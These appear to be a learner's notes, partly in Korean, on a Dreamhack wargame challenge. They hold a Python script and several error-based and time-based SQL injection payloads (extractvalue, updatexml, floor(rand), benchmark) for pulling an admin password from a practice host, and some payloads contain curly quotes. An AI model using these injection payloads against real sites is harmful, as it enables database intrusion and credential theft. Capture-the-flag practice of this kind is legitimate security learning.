from requests import get
url = "http://host1.dreamhack.games:12969/"

#query = f"admin’ and extractvalue(1,concat(0x3a,version()));"
#query = f"admin’ and updatexml(null,concat(0x3a,version()),null);"
#query = f"admin’ and extractvalue(1,concat(0x3a,(SELECT upw FROM user WHERE uid=‘admin’)));"
query = f"admin’ UNION SELECT extractvalue(1,concat(0x3a,(SELECT upw FROM user WHERE uid=‘admin’)));"

r = get(f"{url}/?uid={query}")
print(r.text)

이렇게 코드를 작성하고 실행하면 (1105, “XPATH syntax error: ‘:DH{c3968c78840750168774ad951…’”)처럼 플래그가 잘려서 나옵니다.
=> 일단 나오지 않는다 
replit 환경이든 파이썬 환경이든 나오지 않는다 
이게 기본 얼개는 맞는데 
당연히 여기서 약간의 응용이 더 필요하다 

SELECT extractvalue(1,concat(0x3a,(SELECT password FROM users WHERE username='admin'))); 

SELECT extractvalue(1,concat(0x3a,version()));
SELECT updatexml(null,concat(0x0a,version()),null);
SELECT COUNT(*), CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x;

from requests import get
url = "http://host1.dreamhack.games:12969/"

#query = f"admin’ and extractvalue(1,concat(0x3a,version()));"
#query = f"admin’ and updatexml(null,concat(0x3a,version()),null);"
#query = f"admin’ and extractvalue(1,concat(0x3a,(SELECT upw FROM user WHERE uid=‘admin’)));"
query = f"admin’ UNION SELECT extractvalue(1,concat(0x3a,(SELECT upw FROM user WHERE uid='admin')));"

r = get(f"{url}/?uid={query}")
print(r.text)


admin' limit 1 procedure analyse(extractvalue(1,concat(0x3a,if(ascii(substr(version(),1,1))>10,benchmark(1000000,sha('a')),0))),1);
